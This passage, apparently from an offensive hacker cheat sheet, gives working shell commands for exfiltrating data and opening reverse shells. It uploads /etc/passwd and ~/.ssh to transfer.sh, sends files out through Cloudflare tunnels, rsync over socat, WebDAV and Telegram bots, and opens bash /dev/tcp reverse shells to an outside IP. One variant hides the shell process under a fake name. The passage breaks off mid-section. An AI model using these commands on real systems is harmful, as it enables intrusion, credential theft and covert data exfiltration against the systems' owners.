<div class="language-posh highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="nb">curl </span><span class="n">-X</span> <span class="n">POST</span>  <span class="n">https</span><span class="p">://</span><span class="n">CF-URL-CHANGE-ME</span><span class="p">.</span><span class="n">trycloudflare</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">upload</span> <span class="o">-F</span> <span class="s1">&#39;files=@myfile.txt&#39;</span>
</span></code></pre></div></p>
<hr />
<p><a id="burl"></a></p>
<h3 id="4vi-file-transfer-without-curl">4.vi. File transfer without curl</h3>
<p>Using bash, download only:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>burl<span class="o">()</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a><span class="w">    </span><span class="nv">IFS</span><span class="o">=</span>/<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>proto<span class="w"> </span>x<span class="w"> </span>host<span class="w"> </span>query<span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a><span class="w">    </span><span class="nb">exec</span><span class="w"> </span><span class="m">3</span>&lt;&gt;<span class="s2">&quot;/dev/tcp/</span><span class="si">${</span><span class="nv">host</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">PORT</span><span class="k">:-</span><span class="nv">80</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-103-4"><a id="__codelineno-103-4" name="__codelineno-103-4" href="#__codelineno-103-4"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-en<span class="w"> </span><span class="s2">&quot;GET /</span><span class="si">${</span><span class="nv">query</span><span class="si">}</span><span class="s2"> HTTP/1.0\r\nHost: </span><span class="si">${</span><span class="nv">host</span><span class="si">}</span><span class="s2">\r\n\r\n&quot;</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">3</span>
</span><span id="__span-103-5"><a id="__codelineno-103-5" name="__codelineno-103-5" href="#__codelineno-103-5"></a><span class="w">    </span><span class="o">(</span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>l<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$l</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$l</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">$&#39;\r&#39;</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>break<span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span><span class="o">)</span><span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">3</span>
</span><span id="__span-103-6"><a id="__codelineno-103-6" name="__codelineno-103-6" href="#__codelineno-103-6"></a><span class="w">    </span><span class="nb">exec</span><span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span>-
</span><span id="__span-103-7"><a id="__codelineno-103-7" name="__codelineno-103-7" href="#__codelineno-103-7"></a><span class="o">}</span>
</span><span id="__span-103-8"><a id="__codelineno-103-8" name="__codelineno-103-8" href="#__codelineno-103-8"></a><span class="c1"># burl http://ipinfo.io</span>
</span><span id="__span-103-9"><a id="__codelineno-103-9" name="__codelineno-103-9" href="#__codelineno-103-9"></a><span class="c1"># PORT=31337 burl http://37.120.235.188/blah.tar.gz &gt;blah.tar.gz</span>
</span></code></pre></div></p>
<hr />
<p><a id="trans"></a></p>
<h3 id="4vii-file-transfer-using-a-public-dump">4.vii. File transfer using a public dump</h3>
<p>Cut &amp; paste into your bash:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>transfer<span class="o">()</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span><span class="w"> </span><span class="s2">&quot;Usage:\n    transfer [file/directory]\n    transfer [name] &lt;FILENAME&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="m">255</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span>-t<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>curl<span class="w"> </span>-SsfL<span class="w"> </span>--progress-bar<span class="w"> </span>-T<span class="w"> </span><span class="s2">&quot;-&quot;</span><span class="w"> </span><span class="s2">&quot;https://transfer.sh/</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span><span class="w"> </span><span class="s2">&quot;Not found: </span><span class="nv">$1</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="m">255</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-104-5"><a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a><span class="w">    </span><span class="o">[[</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="o">(</span><span class="nb">cd</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">/..&quot;</span><span class="p">;</span><span class="w"> </span>tar<span class="w"> </span>cfz<span class="w"> </span>-<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="p">##*/</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">)</span><span class="p">|</span>curl<span class="w"> </span>-SsfL<span class="w"> </span>--progress-bar<span class="w"> </span>-T<span class="w"> </span><span class="s2">&quot;-&quot;</span><span class="w"> </span><span class="s2">&quot;https://transfer.sh/</span><span class="si">${</span><span class="nv">1</span><span class="p">##*/</span><span class="si">}</span><span class="s2">.tar.gz&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-104-6"><a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a><span class="w">    </span>curl<span class="w"> </span>-SsfL<span class="w"> </span>--progress-bar<span class="w"> </span>-T<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;https://transfer.sh/</span><span class="si">${</span><span class="nv">1</span><span class="p">##*/</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-104-7"><a id="__codelineno-104-7" name="__codelineno-104-7" href="#__codelineno-104-7"></a><span class="o">}</span>
</span></code></pre></div></p>
<p>then upload a file or a directory:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>transfer<span class="w"> </span>/etc/passwd<span class="w">  </span><span class="c1"># A single file</span>
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>transfer<span class="w"> </span>~/.ssh<span class="w">       </span><span class="c1"># An entire directory</span>
</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a><span class="o">(</span>curl<span class="w"> </span>ipinfo.io<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/cpuinfo<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>transfer<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>hostname<span class="k">)</span><span class="s2">&quot;</span>
</span></code></pre></div>
A list of our <a href="#cloudexfil">favorite public upload sites</a>.</p>
<hr />
<p><a id="rsync"></a></p>
<h3 id="4viii-file-transfer-using-rsync">4.viii. File transfer - using rsync</h3>
<p>Ideal for synchonizing large amount of directories or re-starting broken transfers. The example transfers the directory '<em>warez</em>' to the Receiver using a single TCP connection from the Sender to the Receiver.</p>
<p>Receiver:
<div class="language-posh highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="nb">echo </span><span class="n">-e</span> <span class="s2">&quot;[up]\npath=upload\nread only=false\nuid=</span><span class="p">$(</span><span class="n">id</span> <span class="n">-u</span><span class="p">)</span><span class="s2">\ngid=</span><span class="p">$(</span><span class="n">id</span> <span class="n">-g</span><span class="p">)</span><span class="s2">&quot;</span> <span class="p">&gt;</span><span class="n">r</span><span class="p">.</span><span class="n">conf</span>
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a><span class="n">mkdir</span> <span class="n">upload</span>
</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="n">rsync</span> <span class="p">-</span><span class="n">-daemon</span> <span class="p">-</span><span class="n">-port</span><span class="p">=</span><span class="n">31337</span> <span class="p">-</span><span class="n">-config</span><span class="p">=</span><span class="n">r</span><span class="p">.</span><span class="n">conf</span> <span class="p">-</span><span class="n">-no-detach</span>
</span></code></pre></div></p>
<p>Sender:
<div class="language-posh highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="n">rsync</span> <span class="n">-av</span> <span class="n">warez</span> <span class="n">rsync</span><span class="p">://</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">4</span><span class="p">:</span><span class="n">31337</span><span class="p">/</span><span class="n">up</span>
</span></code></pre></div></p>
<p>The same encrypted (OpenSSL):</p>
<p>Receiver:
<div class="language-posh highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="c"># use rsa:2048 if ed25519 is not supported (e.g. rsync connection error)</span>
</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a><span class="n">openssl</span> <span class="n">req</span> <span class="n">-subj</span> <span class="s1">&#39;/CN=example.com/O=EL/C=XX&#39;</span> <span class="n">-new</span> <span class="n">-newkey</span> <span class="n">ed25519</span> <span class="n">-days</span> <span class="n">14</span> <span class="n">-nodes</span> <span class="n">-x509</span> <span class="n">-keyout</span> <span class="n">ssl</span><span class="p">.</span><span class="n">key</span> <span class="n">-out</span> <span class="n">ssl</span><span class="p">.</span><span class="n">crt</span>
</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a><span class="nb">cat </span><span class="n">ssl</span><span class="p">.</span><span class="n">key</span> <span class="n">ssl</span><span class="p">.</span><span class="n">crt</span> <span class="p">&gt;</span><span class="n">ssl</span><span class="p">.</span><span class="n">pem</span>
</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4" href="#__codelineno-108-4"></a><span class="nb">rm </span><span class="o">-f</span> <span class="n">ssl</span><span class="p">.</span><span class="n">key</span> <span class="n">ssl</span><span class="p">.</span><span class="n">crt</span>
</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5" href="#__codelineno-108-5"></a><span class="n">mkdir</span> <span class="n">upload</span>
</span><span id="__span-108-6"><a id="__codelineno-108-6" name="__codelineno-108-6" href="#__codelineno-108-6"></a><span class="nb">cat </span><span class="n">ssl</span><span class="p">.</span><span class="n">pem</span>
</span><span id="__span-108-7"><a id="__codelineno-108-7" name="__codelineno-108-7" href="#__codelineno-108-7"></a><span class="n">socat</span> <span class="n">OPENSSL-LISTEN</span><span class="p">:</span><span class="n">31337</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span><span class="p">,</span><span class="n">cert</span><span class="p">=</span><span class="n">ssl</span><span class="p">.</span><span class="n">pem</span><span class="p">,</span><span class="n">cafile</span><span class="p">=</span><span class="n">ssl</span><span class="p">.</span><span class="n">pem</span> <span class="n">EXEC</span><span class="p">:</span><span class="s2">&quot;rsync --server -logtprR --safe-links --partial upload&quot;</span>
</span></code></pre></div></p>
<p>Sender:
<div class="language-posh highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a><span class="c"># Copy the ssl.pem from the Receiver to the Sender and send directory named &#39;warez&#39;</span>
</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a><span class="n">IP</span><span class="p">=</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">4</span>
</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a><span class="n">PORT</span><span class="p">=</span><span class="n">31337</span>
</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#__codelineno-109-4"></a><span class="c"># Using rsync + socat-ssl</span>
</span><span id="__span-109-5"><a id="__codelineno-109-5" name="__codelineno-109-5" href="#__codelineno-109-5"></a><span class="n">up1</span><span class="p">()</span> <span class="p">{</span>
</span><span id="__span-109-6"><a id="__codelineno-109-6" name="__codelineno-109-6" href="#__codelineno-109-6"></a>   <span class="n">rsync</span> <span class="n">-ahPRv</span> <span class="n">-e</span> <span class="s2">&quot;bash -c &#39;socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0&#39; #&quot;</span> <span class="p">--</span> <span class="s2">&quot;$@&quot;</span>  <span class="n">0</span><span class="p">:</span>
</span><span id="__span-109-7"><a id="__codelineno-109-7" name="__codelineno-109-7" href="#__codelineno-109-7"></a><span class="p">}</span>
</span><span id="__span-109-8"><a id="__codelineno-109-8" name="__codelineno-109-8" href="#__codelineno-109-8"></a><span class="c"># Using rsync + openssl</span>
</span><span id="__span-109-9"><a id="__codelineno-109-9" name="__codelineno-109-9" href="#__codelineno-109-9"></a><span class="n">up2</span><span class="p">()</span> <span class="p">{</span>
</span><span id="__span-109-10"><a id="__codelineno-109-10" name="__codelineno-109-10" href="#__codelineno-109-10"></a>   <span class="n">rsync</span> <span class="n">-ahPRv</span> <span class="n">-e</span> <span class="s2">&quot;bash -c &#39;openssl s_client -connect ${IP:?}:${PORT:-31337} -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2&gt;/dev/null&#39; #&quot;</span> <span class="p">--</span> <span class="s2">&quot;$@&quot;</span>  <span class="n">0</span><span class="p">:</span>
</span><span id="__span-109-11"><a id="__codelineno-109-11" name="__codelineno-109-11" href="#__codelineno-109-11"></a><span class="p">}</span>
</span><span id="__span-109-12"><a id="__codelineno-109-12" name="__codelineno-109-12" href="#__codelineno-109-12"></a><span class="n">up1</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/./</span><span class="n">warez</span>
</span><span id="__span-109-13"><a id="__codelineno-109-13" name="__codelineno-109-13" href="#__codelineno-109-13"></a><span class="n">up2</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/./</span><span class="n">warez</span>
</span></code></pre></div></p>
<p>Rsync can be combined to exfil via <a href="https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service">https / cloudflared raw TCP tunnels</a>.<br />
(To exfil from Windows, use the rsync.exe from the <a href="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip">gsocket windows package</a>). A noisier solution is <a href="https://syncthing.net/">syncthing</a>.</p>
<p>Pro Tip: Lazy hackers just type <code>exfil</code> on segfault.net.</p>
<hr />
<p><a id="webdav"></a></p>
<h3 id="4ix-file-transfer-using-webdav">4.ix. File transfer - using WebDAV</h3>
<p>On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>cloudflared<span class="w"> </span>tunnel<span class="w"> </span>--url<span class="w"> </span>localhost:8080<span class="w"> </span><span class="p">&amp;</span>
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a><span class="c1"># [...]</span>
</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a><span class="c1"># +--------------------------------------------------------------------------------------------+</span>
</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a><span class="c1"># |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |</span>
</span><span id="__span-110-5"><a id="__codelineno-110-5" name="__codelineno-110-5" href="#__codelineno-110-5"></a><span class="c1"># |  https://example-foo-bar-lights.trycloudflare.com                                          |</span>
</span><span id="__span-110-6"><a id="__codelineno-110-6" name="__codelineno-110-6" href="#__codelineno-110-6"></a><span class="c1"># +--------------------------------------------------------------------------------------------+</span>
</span><span id="__span-110-7"><a id="__codelineno-110-7" name="__codelineno-110-7" href="#__codelineno-110-7"></a><span class="c1"># [...]</span>
</span><span id="__span-110-8"><a id="__codelineno-110-8" name="__codelineno-110-8" href="#__codelineno-110-8"></a>wsgidav<span class="w"> </span>--port<span class="o">=</span><span class="m">8080</span><span class="w"> </span>--root<span class="o">=</span>.<span class="w">  </span>--auth<span class="o">=</span>anonymous
</span></code></pre></div></p>
<p>On another server:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a><span class="c1"># Upload a file to your workstation</span>
</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>curl<span class="w"> </span>-T<span class="w"> </span>file.dat<span class="w"> </span>https://example-foo-bar-lights.trycloudflare.com
</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a><span class="c1"># Create a directory remotely</span>
</span><span id="__span-111-4"><a id="__codelineno-111-4" name="__codelineno-111-4" href="#__codelineno-111-4"></a>curl<span class="w"> </span>-X<span class="w"> </span>MKCOL<span class="w"> </span>https://example-foo-bar-lights.trycloudflare.com/sources
</span><span id="__span-111-5"><a id="__codelineno-111-5" name="__codelineno-111-5" href="#__codelineno-111-5"></a><span class="c1"># Create a directory hirachy remotely</span>
</span><span id="__span-111-6"><a id="__codelineno-111-6" name="__codelineno-111-6" href="#__codelineno-111-6"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>-I<span class="o">{}</span><span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>MKCOL<span class="w"> </span>https://example-foo-bar-lights.trycloudflare.com/sources/<span class="o">{}</span>
</span><span id="__span-111-7"><a id="__codelineno-111-7" name="__codelineno-111-7" href="#__codelineno-111-7"></a><span class="c1"># Upload all *.c files (in parallel):</span>
</span><span id="__span-111-8"><a id="__codelineno-111-8" name="__codelineno-111-8" href="#__codelineno-111-8"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span><span class="s1">&#39;*.c&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>-P10<span class="w"> </span>-I<span class="o">{}</span><span class="w"> </span>curl<span class="w"> </span>-T<span class="o">{}</span><span class="w"> </span>https://example-foo-bar-lights.trycloudflare.com/sources/<span class="o">{}</span>
</span></code></pre></div></p>
<p>Access the share from Windows (to drag &amp; drop files) in File Explorer:
<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>\\example-foo-bar-lights.trycloudflare.com@SSL\sources
</span></code></pre></div></p>
<p>Or mount the WebDAV share on Windows (Z:/):
<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
</span></code></pre></div></p>
<hr />
<p><a id="tg"></a></p>
<h3 id="4x-file-transfer-to-telegram">4.x. File transfer to Telegram</h3>
<p>There are <a href="#cloudexfil">zillions of upload services</a> but TG is a neat alternative. Get a <em>TG-Bot-Token</em> from the <a href="https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token">TG BotFather</a>. Then create a new TG group and add your bot to the group. Retrieve the <em>chat_id</em> of that group:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://api.telegram.org/bot&lt;TG-BOT-TOKEN&gt;/getUpdates&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.result[].message.chat.id&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>uniq
</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a><span class="c1"># If you get only {&quot;ok&quot;:true,&quot;result&quot;:[]} then remove and add the bot again.</span>
</span></code></pre></div></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a><span class="c1"># Upload file.zip straight into the group chat:</span>
</span><span id="__span-115-2"><a id="__codelineno-115-2" name="__codelineno-115-2" href="#__codelineno-115-2"></a>curl<span class="w"> </span>-sF<span class="w"> </span><span class="nv">document</span><span class="o">=</span>@file.zip<span class="w"> </span><span class="s2">&quot;https://api.telegram.org/bot&lt;TG-BOT-TOKEN&gt;/sendDocument?chat_id=&lt;TG-CHAT-ID&gt;&quot;</span>
</span></code></pre></div>
<hr />
<p><a id="reverse-shell"></a></p>
<h2 id="5-reverse-shell-dumb-shell">5. Reverse Shell / Dumb Shell</h2>
<p><a id="reverse-shell-gs-netcat"></a>
<strong>5.i.a. Reverse shell with gs-netcat (encrypted)</strong></p>
<p>Use <a href="https://gsocket.io/deploy">gsocket deploy</a>. It spawns a fully functioning PTY reverse shell. Both, the YOU and the remote system, can be behind NAT and the traffic is routed via a relay network. It also supports file upload/download (Ctrl-e c) and alarms when the admin logs in. If netcat is a swiss army knife than gs-netcat is a german battle axe :&gt;</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a><span class="nv">X</span><span class="o">=</span>ExampleSecretChangeMe<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://gsocket.io/y<span class="k">)</span><span class="s2">&quot;</span>
</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#__codelineno-116-2"></a><span class="c1"># or X=ExampleSecretChangeMe bash -c &quot;$(wget --no-verbose -O- https://gsocket.io/y)&quot;</span>
</span></code></pre></div>
<p>To connect to the shell from your workstation:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a><span class="nv">S</span><span class="o">=</span>ExampleSecretChangeMe<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://gsocket.io/y<span class="k">)</span><span class="s2">&quot;</span>
</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a><span class="c1"># or gs-netcat -s ExampleSecretChangeMe -i</span>
</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#__codelineno-117-3"></a><span class="c1"># Add -T to tunnel through TOR</span>
</span></code></pre></div></p>
<p><a id="reverse-shell-bash"></a>
<strong>5.i.b. Reverse shell with Bash</strong></p>
<p>Start netcat to listen on port 1524 on your system:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">1524</span>
</span></code></pre></div>
After connection, <a href="#reverse-shell-interactive">upgrade</a> your shell to a fully interactive PTY shell. Alternatively use <a href="https://pwncat.org/">pwncat-cs</a> instead of netcat:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>pwncat<span class="w"> </span>-lp<span class="w"> </span><span class="m">1524</span>
</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a><span class="c1"># Press &quot;Ctrl-C&quot; if pwncat gets stuck at &quot;registerd new host ...&quot;.</span>
</span><span id="__span-119-3"><a id="__codelineno-119-3" name="__codelineno-119-3" href="#__codelineno-119-3"></a><span class="c1"># Then type &quot;back&quot; to get the prompt of the remote shell.</span>
</span></code></pre></div></p>
<p>On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a><span class="c1"># If the current shell is Bash already:</span>
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a><span class="o">(</span>bash<span class="w"> </span>-i<span class="w"> </span><span class="p">&amp;</span>&gt;/dev/tcp/3.13.3.7/1524<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="p">&amp;</span>
</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a><span class="c1"># If the current shell is NOT Bash then we need:</span>
</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4" href="#__codelineno-120-4"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;(exec bash -i &amp;&gt;/dev/tcp/3.13.3.7/1524 0&gt;&amp;1) &amp;&#39;</span>
</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5" href="#__codelineno-120-5"></a><span class="c1"># or hide the bash process as &#39;kqueue&#39;</span>
</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6" href="#__codelineno-120-6"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;(exec -a kqueue bash -i &amp;&gt;/dev/tcp/3.13.3.7/1524 0&gt;&amp;1) &amp;&#39;</span>
</span></code></pre></div></p>
<p><a id="curlshell"></a>
<strong>5.i.c. Reverse shell with cURL (encrypted)</strong></p>
<p>Use <a href="https://github.com/SkyperTHC/curlshell">curlshell</a>. This also works through proxies and when direct TCP connection to the outside world is prohibited:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a><span class="c1"># On YOUR workstation</span>
</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a><span class="c1"># Generate SSL keys:</span>
